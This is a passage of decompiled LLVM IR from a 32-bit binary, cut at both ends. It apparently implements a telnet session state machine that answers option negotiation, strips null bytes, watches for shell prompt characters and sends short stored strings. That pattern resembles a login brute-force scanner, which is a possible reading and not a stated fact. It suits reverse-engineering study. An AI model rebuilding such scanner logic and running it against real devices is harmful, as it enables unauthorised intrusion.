  %v1_8050638 = add i32 %v0_8050638, 12
  %v2_8050638 = inttoptr i32 %v1_8050638 to i32*
  %v3_8050638 = load i32, i32* %v2_8050638, align 4
  store i32 %v3_8050638, i32* %eax.global-to-local, align 4
  %v1_805063b = icmp eq i32 %v3_8050638, 0
  br i1 %v1_805063b, label %dec_label_pc_80505e1, label %dec_label_pc_8050638.backedge.dec_label_pc_805063f_crit_edge

dec_label_pc_8050638.backedge.dec_label_pc_805063f_crit_edge: ; preds = %dec_label_pc_8050638.backedge
  %v1_8050642.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805063f

dec_label_pc_8050638.loopexit12.loopexit:         ; preds = %dec_label_pc_8050ad3, %dec_label_pc_8050808, %dec_label_pc_80507ab, %dec_label_pc_80506aa, %dec_label_pc_8050d36, %dec_label_pc_8050a83, %dec_label_pc_8050a0a, %dec_label_pc_80509cc, %dec_label_pc_80508fd, %dec_label_pc_8050cbd, %dec_label_pc_8050875, %dec_label_pc_8050daf, %dec_label_pc_8050830, %dec_label_pc_8050e28, %dec_label_pc_80505fc
  %v0_8050638.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050638.backedge

dec_label_pc_805063f:                             ; preds = %dec_label_pc_8050638.preheader, %dec_label_pc_8050638.backedge.dec_label_pc_805063f_crit_edge
  %v1_8050642 = phi i32 [ %v1_8050642.pre, %dec_label_pc_8050638.backedge.dec_label_pc_805063f_crit_edge ], [ %v0_80505d2, %dec_label_pc_8050638.preheader ]
  %v0_805063f = phi i32 [ %v0_8050638, %dec_label_pc_8050638.backedge.dec_label_pc_805063f_crit_edge ], [ %v0_805063827, %dec_label_pc_8050638.preheader ]
  %v1_805063f = add i32 %v0_805063f, 28
  store i32 %v1_805063f, i32* %eax.global-to-local, align 4
  %v2_8050642 = add i32 %v1_8050642, 16
  %v3_8050642 = inttoptr i32 %v2_8050642 to i32*
  store i32 %v1_805063f, i32* %v3_8050642, align 4
  %v0_8050646 = load i32, i32* @edi, align 4
  %v1_8050646 = add i32 %v0_8050646, 24
  %v2_8050646 = inttoptr i32 %v1_8050646 to i32*
  %v3_8050646 = load i32, i32* %v2_8050646, align 4
  %v9_8050646 = icmp eq i32 %v3_8050646, 256
  br i1 %v9_8050646, label %dec_label_pc_8050bf7, label %dec_label_pc_8050653

dec_label_pc_8050653:                             ; preds = %dec_label_pc_805063f, %dec_label_pc_8050bf7
  %v0_8050653 = load i32, i32* @esp, align 4
  %v1_8050653 = add i32 %v0_8050653, 40
  %v2_8050653 = inttoptr i32 %v1_8050653 to i32*
  %v3_8050653 = load i32, i32* %v2_8050653, align 4
  store i32 %v3_8050653, i32* %ecx.global-to-local, align 4
  %v1_8050657 = add i32 %v0_8050653, 16
  %v2_8050657 = inttoptr i32 %v1_8050657 to i32*
  %v3_8050657 = load i32, i32* %v2_8050657, align 4
  store i32 %v3_8050657, i32* %ebx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v1_8050660 = inttoptr i32 %v3_8050653 to i32*
  store i32 0, i32* %v1_8050660, align 4
  %v0_8050666 = load i32, i32* @edi, align 4
  %v1_8050666 = add i32 %v0_8050666, 24
  %v2_8050666 = inttoptr i32 %v1_8050666 to i32*
  %v3_8050666 = load i32, i32* %v2_8050666, align 4
  store i32 %v3_8050666, i32* %edx.global-to-local, align 4
  %v0_8050669 = load i32, i32* @esp, align 4
  %v1_8050669 = add i32 %v0_8050669, -4
  %v2_8050669 = inttoptr i32 %v1_8050669 to i32*
  store i32 16384, i32* %v2_8050669, align 4
  %v0_805066e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805066e = load i32, i32* %edx.global-to-local, align 4
  %v2_805066e = add i32 %v1_805066e, %v0_805066e
  store i32 %v2_805066e, i32* @ebx, align 4
  %v0_8050670 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050670 = sub i32 %v0_8050670, %v1_805066e
  store i32 %v2_8050670, i32* %eax.global-to-local, align 4
  %v2_8050672 = add i32 %v0_8050669, -8
  %v3_8050672 = inttoptr i32 %v2_8050672 to i32*
  store i32 %v2_8050670, i32* %v3_8050672, align 4
  %v0_8050673 = load i32, i32* @ebx, align 4
  %v2_8050673 = add i32 %v0_8050669, -12
  %v3_8050673 = inttoptr i32 %v2_8050673 to i32*
  store i32 %v0_8050673, i32* %v3_8050673, align 4
  %v0_8050674 = load i32, i32* @edi, align 4
  %v1_8050674 = add i32 %v0_8050674, 4
  %v2_8050674 = inttoptr i32 %v1_8050674 to i32*
  %v3_8050674 = load i32, i32* %v2_8050674, align 4
  %v2_8050677 = add i32 %v0_8050669, -16
  %v3_8050677 = inttoptr i32 %v2_8050677 to i32*
  store i32 %v3_8050674, i32* %v3_8050677, align 4
  %v0_8050678 = call i32 @function_805290e()
  store i32 %v0_8050678, i32* %eax.global-to-local, align 4
  %v0_805067d = load i32, i32* @esp, align 4
  %v1_805067d = add i32 %v0_805067d, 16
  %tmp137 = icmp slt i32 %v0_8050678, 1
  br i1 %tmp137, label %dec_label_pc_8050b8c, label %dec_label_pc_8050689

dec_label_pc_8050689:                             ; preds = %dec_label_pc_8050653
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_805068b

dec_label_pc_805068b:                             ; preds = %dec_label_pc_8050695, %dec_label_pc_8050689
  %v0_8050691 = phi i32 [ %v1_8050695, %dec_label_pc_8050695 ], [ 0, %dec_label_pc_8050689 ]
  %v1_805068b = load i32, i32* @ebx, align 4
  %v2_805068b = add i32 %v1_805068b, %v0_8050691
  %v3_805068b = inttoptr i32 %v2_805068b to i8*
  %v4_805068b = load i8, i8* %v3_805068b, align 1
  %v5_805068b = icmp eq i8 %v4_805068b, 0
  %v1_805068f = icmp eq i1 %v5_805068b, false
  br i1 %v1_805068f, label %dec_label_pc_8050695, label %dec_label_pc_8050691

dec_label_pc_8050691:                             ; preds = %dec_label_pc_805068b
  store i8 65, i8* %v3_805068b, align 1
  %v0_8050695.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050695

dec_label_pc_8050695:                             ; preds = %dec_label_pc_805068b, %dec_label_pc_8050691
  %v0_8050695 = phi i32 [ %v0_8050691, %dec_label_pc_805068b ], [ %v0_8050695.pre, %dec_label_pc_8050691 ]
  %v1_8050695 = add i32 %v0_8050695, 1
  store i32 %v1_8050695, i32* @edx, align 4
  %v12_8050696 = icmp eq i32 %v0_8050678, %v1_8050695
  %v1_8050698 = icmp eq i1 %v12_8050696, false
  br i1 %v1_8050698, label %dec_label_pc_805068b, label %dec_label_pc_805069a

dec_label_pc_805069a:                             ; preds = %dec_label_pc_8050695, %dec_label_pc_8050b92
  %v0_805069a = load i32, i32* @edi, align 4
  %v1_805069a = add i32 %v0_805069a, 24
  %v2_805069a = inttoptr i32 %v1_805069a to i32*
  %v3_805069a = load i32, i32* %v2_805069a, align 4
  %v2_805069d = add i32 %v3_805069a, %v0_8050678
  store i32 %v2_805069d, i32* @ebx, align 4
  %v0_805069f = load i32, i32* @global_var_8056990.34, align 16
  store i32 %v0_805069f, i32* %eax.global-to-local, align 4
  store i32 %v2_805069d, i32* %v2_805069a, align 4
  %v0_80506a7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80506a7 = load i32, i32* @edi, align 4
  %v2_80506a7 = add i32 %v1_80506a7, 8
  %v3_80506a7 = inttoptr i32 %v2_80506a7 to i32*
  store i32 %v0_80506a7, i32* %v3_80506a7, align 4
  br label %dec_label_pc_80506aa

dec_label_pc_80506aa:                             ; preds = %dec_label_pc_80509ac, %dec_label_pc_805069a
  %v0_80506aa = load i32, i32* @edi, align 4
  %v1_80506aa = add i32 %v0_80506aa, 12
  %v2_80506aa = inttoptr i32 %v1_80506aa to i32*
  %v3_80506aa = load i32, i32* %v2_80506aa, align 4
  store i32 %v3_80506aa, i32* %eax.global-to-local, align 4
  switch i32 %v3_80506aa, label %dec_label_pc_8050638.loopexit12.loopexit [
    i32 2, label %dec_label_pc_80506ba
    i32 3, label %dec_label_pc_805074d
    i32 4, label %dec_label_pc_80507d3
    i32 5, label %dec_label_pc_80505fc
    i32 6, label %dec_label_pc_8050875
    i32 7, label %dec_label_pc_80509cc
    i32 8, label %dec_label_pc_8050830
    i32 9, label %dec_label_pc_8050a83
    i32 10, label %dec_label_pc_80508c0
  ]

dec_label_pc_80506ba:                             ; preds = %dec_label_pc_80506aa
  %v0_80506ba = load i32, i32* @esp, align 4
  %v1_80506ba = add i32 %v0_80506ba, 16
  %v2_80506ba = inttoptr i32 %v1_80506ba to i32*
  %v3_80506ba = load i32, i32* %v2_80506ba, align 4
  store i32 %v3_80506ba, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v1_80506c0 = add i32 %v0_80506aa, 24
  %v2_80506c0 = inttoptr i32 %v1_80506c0 to i32*
  %v3_80506c0 = load i32, i32* %v2_80506c0, align 4
  store i32 %v3_80506c0, i32* %edx.global-to-local, align 4
  %v2_80506c318 = sub i32 0, %v3_80506c0
  %v10_80506c322 = and i32 %v3_80506c0, %v2_80506c318
  %v11_80506c323 = icmp slt i32 %v10_80506c322, 0
  %v13_80506c325 = icmp slt i32 %v2_80506c318, 0
  %v2_80506c526 = icmp eq i1 %v13_80506c325, %v11_80506c323
  br i1 %v2_80506c526, label %dec_label_pc_8050ad3.thread, label %dec_label_pc_80506c7.preheader

dec_label_pc_8050ad3.thread:                      ; preds = %dec_label_pc_80506ba
  br label %dec_label_pc_8050638.backedge

dec_label_pc_80506c7.preheader:                   ; preds = %dec_label_pc_80506ba, %dec_label_pc_80506c3.backedge
  %v0_8050741126 = phi i32 [ %v0_8050741128, %dec_label_pc_80506c3.backedge ], [ %v0_80506aa, %dec_label_pc_80506ba ]
  %v0_8050acb119 = phi i32 [ %v0_80506c3, %dec_label_pc_80506c3.backedge ], [ 0, %dec_label_pc_80506ba ]
  %v5_80506d9108 = phi i32 [ %v5_80506d9109, %dec_label_pc_80506c3.backedge ], [ 2, %dec_label_pc_80506ba ]
  %v1_80506d3106 = phi i32 [ %v1_80506c3, %dec_label_pc_80506c3.backedge ], [ %v3_80506c0, %dec_label_pc_80506ba ]
  %v0_80506cc103 = phi i32 [ %v0_80506cc104, %dec_label_pc_80506c3.backedge ], [ %v0_80506ba, %dec_label_pc_80506ba ]
  br label %dec_label_pc_80506c7

dec_label_pc_80506c7:                             ; preds = %dec_label_pc_80506c7.preheader, %dec_label_pc_8050718
  %v0_8050741129 = phi i32 [ %v0_8050741126, %dec_label_pc_80506c7.preheader ], [ %v0_805072f, %dec_label_pc_8050718 ]
  %v0_8050acb = phi i32 [ %v0_8050acb119, %dec_label_pc_80506c7.preheader ], [ %v0_8050735, %dec_label_pc_8050718 ]
  %v5_80506d9 = phi i32 [ %v5_80506d9108, %dec_label_pc_80506c7.preheader ], [ %v0_805072a, %dec_label_pc_8050718 ]
  %v1_80506d3 = phi i32 [ %v1_80506d3106, %dec_label_pc_80506c7.preheader ], [ %v3_805072f, %dec_label_pc_8050718 ]
  %v0_8050ae0 = phi i32 [ %v0_80506cc103, %dec_label_pc_80506c7.preheader ], [ %v1_8050732, %dec_label_pc_8050718 ]
  %v0_80506c7 = load i32, i32* @ebx, align 4
  %v1_80506c7 = inttoptr i32 %v0_80506c7 to i8*
  %v2_80506c7 = load i8, i8* %v1_80506c7, align 1
  %v12_80506c7 = icmp eq i8 %v2_80506c7, -1
  %v1_80506ca = icmp eq i1 %v12_80506c7, false
  br i1 %v1_80506ca, label %dec_label_pc_8050739, label %dec_label_pc_80506cc

dec_label_pc_80506cc:                             ; preds = %dec_label_pc_80506c7
  %v1_80506cc = add i32 %v0_8050ae0, 16
  %v2_80506cc = inttoptr i32 %v1_80506cc to i32*
  %v3_80506cc = load i32, i32* %v2_80506cc, align 4
  %v1_80506d0 = add i32 %v0_80506c7, 1
  store i32 %v1_80506d0, i32* @esi, align 4
  %v2_80506d3 = add i32 %v3_80506cc, %v1_80506d3
  store i32 %v2_80506d3, i32* %ecx.global-to-local, align 4
  %tmp297 = icmp ugt i32 %v2_80506d3, %v1_80506d0
  br i1 %tmp297, label %dec_label_pc_80506d9, label %dec_label_pc_8050739

dec_label_pc_80506d9:                             ; preds = %dec_label_pc_80506cc
  %v2_80506d9 = inttoptr i32 %v1_80506d0 to i8*
  %v3_80506d9 = load i8, i8* %v2_80506d9, align 1
  %v4_80506d9 = zext i8 %v3_80506d9 to i32
  %v6_80506d9 = and i32 %v5_80506d9, -256
  %v7_80506d9 = or i32 %v4_80506d9, %v6_80506d9
  store i32 %v7_80506d9, i32* %eax.global-to-local, align 4
  %v11_80506dc = icmp eq i8 %v3_80506d9, -1
  br i1 %v11_80506dc, label %dec_label_pc_8050ac8, label %dec_label_pc_80506e4

dec_label_pc_80506e4:                             ; preds = %dec_label_pc_80506d9
  %v11_80506e4 = icmp eq i8 %v3_80506d9, -3
  br i1 %v11_80506e4, label %dec_label_pc_8050ae0, label %dec_label_pc_80506ec

dec_label_pc_80506ec:                             ; preds = %dec_label_pc_80506e4
  %v1_80506ec = add i32 %v0_80506c7, 2
  store i32 %v1_80506ec, i32* %eax.global-to-local, align 4
  %tmp298 = icmp ugt i32 %v2_80506d3, %v1_80506ec
  br i1 %tmp298, label %dec_label_pc_80506f3, label %dec_label_pc_8050739

dec_label_pc_80506f3:                             ; preds = %dec_label_pc_80506ec, %dec_label_pc_80510b3, %dec_label_pc_80510bb
  %v4_80506f3 = phi i32 [ %v6_8050b5e, %dec_label_pc_80510b3 ], [ %v1_80506ec, %dec_label_pc_80506ec ], [ %v4_80506f3.pre, %dec_label_pc_80510bb ]
  %v0_80506f3 = load i32, i32* @esi, align 4
  %v1_80506f3 = inttoptr i32 %v0_80506f3 to i8*
  %v2_80506f3 = load i8, i8* %v1_80506f3, align 1
  %v3_80506f3 = zext i8 %v2_80506f3 to i32
  %v5_80506f3 = and i32 %v4_80506f3, -256
  %v6_80506f3 = or i32 %v3_80506f3, %v5_80506f3
  store i32 %v6_80506f3, i32* %eax.global-to-local, align 4
  %v11_80506f5 = icmp eq i8 %v2_80506f3, -3
  br i1 %v11_80506f5, label %dec_label_pc_8050b75, label %dec_label_pc_80506fd

dec_label_pc_80506fd:                             ; preds = %dec_label_pc_8050b68, %dec_label_pc_80506f3
  %v0_8050be6 = phi i32 [ %v0_8050b6b, %dec_label_pc_8050b68 ], [ %v0_80506f3, %dec_label_pc_80506f3 ]
  %v0_80506fd = phi i32 [ %v6_8050b6b, %dec_label_pc_8050b68 ], [ %v6_80506f3, %dec_label_pc_80506f3 ]
  %v1_80506fd = trunc i32 %v0_80506fd to i8
  %v11_80506fd = icmp eq i8 %v1_80506fd, -5
  br i1 %v11_80506fd, label %dec_label_pc_8050be6, label %dec_label_pc_8050705

dec_label_pc_8050705:                             ; preds = %dec_label_pc_80506fd, %dec_label_pc_8050be6
  %v5_8050705 = phi i32 [ %v0_80506fd, %dec_label_pc_80506fd ], [ %v5_8050705.pre, %dec_label_pc_8050be6 ]
  %v0_8050705 = load i32, i32* @ebx, align 4
  %v1_8050705 = add i32 %v0_8050705, 2
  %v2_8050705 = inttoptr i32 %v1_8050705 to i8*
  %v3_8050705 = load i8, i8* %v2_8050705, align 1
  %v4_8050705 = zext i8 %v3_8050705 to i32
  %v6_8050705 = and i32 %v5_8050705, -256
  %v7_8050705 = or i32 %v4_8050705, %v6_8050705
  store i32 %v7_8050705, i32* %eax.global-to-local, align 4
  %v11_8050708 = icmp eq i8 %v3_8050705, -3
  br i1 %v11_8050708, label %dec_label_pc_8050b83, label %dec_label_pc_8050710

dec_label_pc_8050710:                             ; preds = %dec_label_pc_8050b75, %dec_label_pc_8050705
  %v0_8050bee = phi i32 [ %v0_8050b78, %dec_label_pc_8050b75 ], [ %v0_8050705, %dec_label_pc_8050705 ]
  %v0_8050710 = phi i32 [ %v7_8050b78, %dec_label_pc_8050b75 ], [ %v7_8050705, %dec_label_pc_8050705 ]
  %v1_8050710 = trunc i32 %v0_8050710 to i8
  %v11_8050710 = icmp eq i8 %v1_8050710, -5
  br i1 %v11_8050710, label %dec_label_pc_8050bee, label %dec_label_pc_8050718

dec_label_pc_8050718:                             ; preds = %dec_label_pc_8050710, %dec_label_pc_8050bee, %dec_label_pc_8050b83
  %v0_8050718 = load i32, i32* @esp, align 4
  %v1_8050718 = add i32 %v0_8050718, -4
  %v2_8050718 = inttoptr i32 %v1_8050718 to i32*
  store i32 16384, i32* %v2_8050718, align 4
  %v1_805071d = add i32 %v0_8050718, -8
  %v2_805071d = inttoptr i32 %v1_805071d to i32*
  store i32 3, i32* %v2_805071d, align 4
  %v0_805071f = load i32, i32* @ebx, align 4
  %v2_805071f = add i32 %v0_8050718, -12
  %v3_805071f = inttoptr i32 %v2_805071f to i32*
  store i32 %v0_805071f, i32* %v3_805071f, align 4
  %v0_8050720 = load i32, i32* @ebp, align 4
  %v1_8050720 = add i32 %v0_8050720, 3
  store i32 %v1_8050720, i32* @ebp, align 4
  %v0_8050723 = load i32, i32* @edi, align 4
  %v1_8050723 = add i32 %v0_8050723, 4
  %v2_8050723 = inttoptr i32 %v1_8050723 to i32*
  %v3_8050723 = load i32, i32* %v2_8050723, align 4
  store i32 %v3_8050723, i32* %edx.global-to-local, align 4
  %v0_8050726 = load i32, i32* @ebx, align 4
  %v1_8050726 = add i32 %v0_8050726, 3
  store i32 %v1_8050726, i32* @ebx, align 4
  %v2_8050729 = add i32 %v0_8050718, -16
  %v3_8050729 = inttoptr i32 %v2_8050729 to i32*
  store i32 %v3_8050723, i32* %v3_8050729, align 4
  %v0_805072a = call i32 @function_8052984()
  store i32 %v0_805072a, i32* %eax.global-to-local, align 4
  %v0_805072f = load i32, i32* @edi, align 4
  %v1_805072f = add i32 %v0_805072f, 24
  %v2_805072f = inttoptr i32 %v1_805072f to i32*
  %v3_805072f = load i32, i32* %v2_805072f, align 4
  store i32 %v3_805072f, i32* %edx.global-to-local, align 4
  %v0_8050732 = load i32, i32* @esp, align 4
  %v1_8050732 = add i32 %v0_8050732, 16
  %v0_8050735 = load i32, i32* @ebp, align 4
  %v2_8050735 = sub i32 %v0_8050735, %v3_805072f
  %v8_8050735 = xor i32 %v0_8050735, %v3_805072f
  %v9_8050735 = xor i32 %v2_8050735, %v0_8050735
  %v10_8050735 = and i32 %v9_8050735, %v8_8050735
  %v11_8050735 = icmp slt i32 %v10_8050735, 0
  %v13_8050735 = icmp slt i32 %v2_8050735, 0
  %v2_8050737 = icmp eq i1 %v13_8050735, %v11_8050735
  br i1 %v2_8050737, label %dec_label_pc_8050739, label %dec_label_pc_80506c7

dec_label_pc_8050739:                             ; preds = %dec_label_pc_80506c3.backedge, %dec_label_pc_80506ec, %dec_label_pc_80506cc, %dec_label_pc_8050718, %dec_label_pc_80506c7, %dec_label_pc_8050ae0.dec_label_pc_8050739.loopexit_crit_edge
  %v0_8050741 = phi i32 [ %v0_8050b44, %dec_label_pc_8050ae0.dec_label_pc_8050739.loopexit_crit_edge ], [ %v0_805072f, %dec_label_pc_8050718 ], [ %v0_8050741129, %dec_label_pc_80506ec ], [ %v0_8050741129, %dec_label_pc_80506cc ], [ %v0_8050741129, %dec_label_pc_80506c7 ], [ %v0_8050741128, %dec_label_pc_80506c3.backedge ]
  %v0_8050739 = phi i32 [ %v0_8050739.pre.pre, %dec_label_pc_8050ae0.dec_label_pc_8050739.loopexit_crit_edge ], [ %v0_8050735, %dec_label_pc_8050718 ], [ %v0_8050acb, %dec_label_pc_80506ec ], [ %v0_8050acb, %dec_label_pc_80506cc ], [ %v0_8050acb, %dec_label_pc_80506c7 ], [ %v0_80506c3, %dec_label_pc_80506c3.backedge ]
  %tmp138 = icmp slt i32 %v0_8050739, 1
  br i1 %tmp138, label %dec_label_pc_8050ad3, label %dec_label_pc_8050741

dec_label_pc_8050741:                             ; preds = %dec_label_pc_8050739
  %v1_8050741 = add i32 %v0_8050741, 12
  %v2_8050741 = inttoptr i32 %v1_8050741 to i32*
  store i32 3, i32* %v2_8050741, align 4
  br label %dec_label_pc_80509a1

dec_label_pc_805074d:                             ; preds = %dec_label_pc_80506aa
  %v1_805074d = add i32 %v0_80506aa, 24
  %v2_805074d = inttoptr i32 %v1_805074d to i32*
  %v3_805074d = load i32, i32* %v2_805074d, align 4
  store i32 %v3_805074d, i32* %ecx.global-to-local, align 4
  %v1_8050750 = add i32 %v3_805074d, -1
  store i32 %v1_8050750, i32* %eax.global-to-local, align 4
  %tmp139 = icmp slt i32 %v1_8050750, 1
  br i1 %tmp139, label %dec_label_pc_805078b, label %dec_label_pc_8050757.preheader

dec_label_pc_8050757.preheader:                   ; preds = %dec_label_pc_805074d
  %v7_8050757.pre = load i32, i32* @edx, align 4
  %v2_8050757 = add i32 %v0_80506aa, 28
  br label %dec_label_pc_8050757

dec_label_pc_8050757:                             ; preds = %dec_label_pc_8050757.preheader, %dec_label_pc_8050788
  %v7_8050757 = phi i32 [ %v7_8050757.pre, %dec_label_pc_8050757.preheader ], [ %v9_8050757, %dec_label_pc_8050788 ]
  %v0_8050c1a = phi i32 [ %v1_8050750, %dec_label_pc_8050757.preheader ], [ %v1_8050788, %dec_label_pc_8050788 ]
  %v3_8050757 = add i32 %v2_8050757, %v0_8050c1a
  %v4_8050757 = inttoptr i32 %v3_8050757 to i8*
  %v5_8050757 = load i8, i8* %v4_8050757, align 1
  %v6_8050757 = zext i8 %v5_8050757 to i32
  %v8_8050757 = and i32 %v7_8050757, -256
  %v9_8050757 = or i32 %v6_8050757, %v8_8050757
  store i32 %v9_8050757, i32* %edx.global-to-local, align 4
  %v10_805075b = icmp eq i8 %v5_8050757, 58
  br i1 %v10_805075b, label %dec_label_pc_8050c1a, label %dec_label_pc_8050764

dec_label_pc_8050764:                             ; preds = %dec_label_pc_8050757
  %v10_8050764 = icmp eq i8 %v5_8050757, 62
  br i1 %v10_8050764, label %dec_label_pc_8050c1a, label %dec_label_pc_805076d

dec_label_pc_805076d:                             ; preds = %dec_label_pc_8050764
  %v10_805076d = icmp eq i8 %v5_8050757, 36
  br i1 %v10_805076d, label %dec_label_pc_8050c1a, label %dec_label_pc_8050776

dec_label_pc_8050776:                             ; preds = %dec_label_pc_805076d
  %v10_8050776 = icmp eq i8 %v5_8050757, 35
  br i1 %v10_8050776, label %dec_label_pc_8050c1a, label %dec_label_pc_805077f

dec_label_pc_805077f:                             ; preds = %dec_label_pc_8050776
  %v10_805077f = icmp eq i8 %v5_8050757, 37
  br i1 %v10_805077f, label %dec_label_pc_8050c1a, label %dec_label_pc_8050788

dec_label_pc_8050788:                             ; preds = %dec_label_pc_805077f
  %v1_8050788 = add i32 %v0_8050c1a, -1
  %v8_8050788 = icmp eq i32 %v1_8050788, 0
  store i32 %v1_8050788, i32* %eax.global-to-local, align 4
  %v1_8050789 = icmp eq i1 %v8_8050788, false
  br i1 %v1_8050789, label %dec_label_pc_8050757, label %dec_label_pc_805078b

dec_label_pc_805078b:                             ; preds = %dec_label_pc_8050788, %dec_label_pc_8050c1a, %dec_label_pc_805074d
  %v0_805078b = load i32, i32* @esp, align 4
  %v1_805078b = add i32 %v0_805078b, -4
  %v2_805078b = inttoptr i32 %v1_805078b to i32*
  store i32 4, i32* %v2_805078b, align 4
  %v1_805078d = add i32 %v0_805078b, -8
  %v2_805078d = inttoptr i32 %v1_805078d to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054d6e.46 to i32), i32* %v2_805078d, align 4
  %v0_8050792 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050792 = add i32 %v0_805078b, -12
  %v3_8050792 = inttoptr i32 %v2_8050792 to i32*
  store i32 %v0_8050792, i32* %v3_8050792, align 4
  %v1_8050793 = add i32 %v0_805078b, 16
  %v2_8050793 = inttoptr i32 %v1_8050793 to i32*
  %v3_8050793 = load i32, i32* %v2_8050793, align 4
  store i32 %v3_8050793, i32* %eax.global-to-local, align 4
  %v2_8050797 = add i32 %v0_805078b, -16
  %v3_8050797 = inttoptr i32 %v2_8050797 to i32*
  store i32 %v3_8050793, i32* %v3_8050797, align 4
  %v0_8050798 = call i32 @function_8051d50()
  store i32 %v0_8050798, i32* %eax.global-to-local, align 4
  %v0_805079d = load i32, i32* @esp, align 4
  store i32 %v0_8050798, i32* @ebp, align 4
  %v10_80507a2 = icmp eq i32 %v0_8050798, -1
  %v1_80507a5 = icmp eq i1 %v10_80507a2, false
  br i1 %v1_80507a5, label %dec_label_pc_8050c26, label %dec_label_pc_80507ab

dec_label_pc_80507ab:                             ; preds = %dec_label_pc_805078b
  %v1_80507ab = add i32 %v0_805079d, 12
  %v2_80507ab = inttoptr i32 %v1_80507ab to i32*
  store i32 5, i32* %v2_80507ab, align 4
  %v1_80507ad = add i32 %v0_805079d, 8
  %v2_80507ad = inttoptr i32 %v1_80507ad to i32*
  store i32 ptrtoint ([6 x i8]* @global_var_8054d73.47 to i32), i32* %v2_80507ad, align 4
  %v0_80507b2 = load i32, i32* @edi, align 4
  %v1_80507b2 = add i32 %v0_80507b2, 24
  %v2_80507b2 = inttoptr i32 %v1_80507b2 to i32*
  %v3_80507b2 = load i32, i32* %v2_80507b2, align 4
  store i32 %v3_80507b2, i32* %eax.global-to-local, align 4
  %v2_80507b5 = add i32 %v0_805079d, 4
  %v3_80507b5 = inttoptr i32 %v2_80507b5 to i32*
  store i32 %v3_80507b2, i32* %v3_80507b5, align 4
  %v1_80507b6 = add i32 %v0_805079d, 32
  %v2_80507b6 = inttoptr i32 %v1_80507b6 to i32*
  %v3_80507b6 = load i32, i32* %v2_80507b6, align 4
  store i32 %v3_80507b6, i32* %eax.global-to-local, align 4
  %v3_80507ba = inttoptr i32 %v0_805079d to i32*
  store i32 %v3_80507b6, i32* %v3_80507ba, align 4
  %v0_80507bb = call i32 @function_8051d50()
  store i32 %v0_80507bb, i32* %eax.global-to-local, align 4
  store i32 %v0_80507bb, i32* @ebp, align 4
  %v10_80507c5 = icmp eq i32 %v0_80507bb, -1
  %v1_80507c8 = icmp eq i1 %v10_80507c5, false
  br i1 %v1_80507c8, label %dec_label_pc_8050c26, label %dec_label_pc_8050638.loopexit12.loopexit

dec_label_pc_80507d3:                             ; preds = %dec_label_pc_80506aa
  %v1_80507d3 = add i32 %v0_80506aa, 24
  %v2_80507d3 = inttoptr i32 %v1_80507d3 to i32*
  %v3_80507d3 = load i32, i32* %v2_80507d3, align 4
  store i32 %v3_80507d3, i32* %ecx.global-to-local, align 4
  %v1_80507d6 = add i32 %v3_80507d3, -1
  store i32 %v1_80507d6, i32* %eax.global-to-local, align 4
  %tmp140 = icmp slt i32 %v1_80507d6, 1
  br i1 %tmp140, label %dec_label_pc_8050808, label %dec_label_pc_80507dd.preheader

dec_label_pc_80507dd.preheader:                   ; preds = %dec_label_pc_80507d3
  %v7_80507dd.pre = load i32, i32* @edx, align 4
  %v2_80507dd = add i32 %v0_80506aa, 28
  br label %dec_label_pc_80507dd

dec_label_pc_80507dd:                             ; preds = %dec_label_pc_80507dd.preheader, %dec_label_pc_8050805
  %v7_80507dd = phi i32 [ %v7_80507dd.pre, %dec_label_pc_80507dd.preheader ], [ %v9_80507dd, %dec_label_pc_8050805 ]
  %v0_8050c6b = phi i32 [ %v1_80507d6, %dec_label_pc_80507dd.preheader ], [ %v1_8050805, %dec_label_pc_8050805 ]
  %v3_80507dd = add i32 %v2_80507dd, %v0_8050c6b
  %v4_80507dd = inttoptr i32 %v3_80507dd to i8*
  %v5_80507dd = load i8, i8* %v4_80507dd, align 1
  %v6_80507dd = zext i8 %v5_80507dd to i32
  %v8_80507dd = and i32 %v7_80507dd, -256
  %v9_80507dd = or i32 %v6_80507dd, %v8_80507dd
  store i32 %v9_80507dd, i32* %edx.global-to-local, align 4
  %v10_80507e1 = icmp eq i8 %v5_80507dd, 58
  br i1 %v10_80507e1, label %dec_label_pc_8050c6b, label %dec_label_pc_80507ea

dec_label_pc_80507ea:                             ; preds = %dec_label_pc_80507dd
  %v10_80507ea = icmp eq i8 %v5_80507dd, 62
  br i1 %v10_80507ea, label %dec_label_pc_8050c6b, label %dec_label_pc_80507f3

dec_label_pc_80507f3:                             ; preds = %dec_label_pc_80507ea
  %v10_80507f3 = icmp eq i8 %v5_80507dd, 36
  br i1 %v10_80507f3, label %dec_label_pc_8050c6b, label %dec_label_pc_80507fc

dec_label_pc_80507fc:                             ; preds = %dec_label_pc_80507f3
  %v10_80507fc = icmp eq i8 %v5_80507dd, 35
  br i1 %v10_80507fc, label %dec_label_pc_8050c6b, label %dec_label_pc_8050805

dec_label_pc_8050805:                             ; preds = %dec_label_pc_80507fc
  %v1_8050805 = add i32 %v0_8050c6b, -1
  %v8_8050805 = icmp eq i32 %v1_8050805, 0
  store i32 %v1_8050805, i32* %eax.global-to-local, align 4
  %v1_8050806 = icmp eq i1 %v8_8050805, false
  br i1 %v1_8050806, label %dec_label_pc_80507dd, label %dec_label_pc_8050808

dec_label_pc_8050808:                             ; preds = %dec_label_pc_8050805, %dec_label_pc_8050c6b, %dec_label_pc_80507d3
  %v0_8050808 = load i32, i32* @esp, align 4
  %v1_8050808 = add i32 %v0_8050808, -4
  %v2_8050808 = inttoptr i32 %v1_8050808 to i32*
  store i32 7, i32* %v2_8050808, align 4
  %v1_805080a = add i32 %v0_8050808, -8
  %v2_805080a = inttoptr i32 %v1_805080a to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_8054d79.48 to i32), i32* %v2_805080a, align 4
  %v0_805080f = load i32, i32* %ecx.global-to-local, align 4
  %v2_805080f = add i32 %v0_8050808, -12
  %v3_805080f = inttoptr i32 %v2_805080f to i32*
  store i32 %v0_805080f, i32* %v3_805080f, align 4
  %v1_8050810 = add i32 %v0_8050808, 16
  %v2_8050810 = inttoptr i32 %v1_8050810 to i32*
